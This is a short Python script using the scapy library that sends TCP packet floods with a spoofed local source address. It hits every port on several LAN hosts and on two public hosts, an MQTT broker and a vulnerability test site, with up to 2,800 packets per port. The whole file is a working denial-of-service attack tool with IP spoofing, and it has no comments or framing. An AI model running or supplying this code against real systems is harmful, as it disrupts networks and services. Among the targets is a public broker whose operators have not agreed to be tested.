#! /usr/bin/python

import random
from scapy.all import *
rnd = random.randint(0,2000)
rnd2 = random.randint(0,255)
sub = str(random.randint(30,39))
srcip = '192.168.1.'+ sub
for port in range(1, 65535):
	send(IP(src=srcip, dst="broker.hivemq.com", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.190", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.193", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.194", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.195", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.184", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.152", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="testphp.vulnweb.com", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	

	
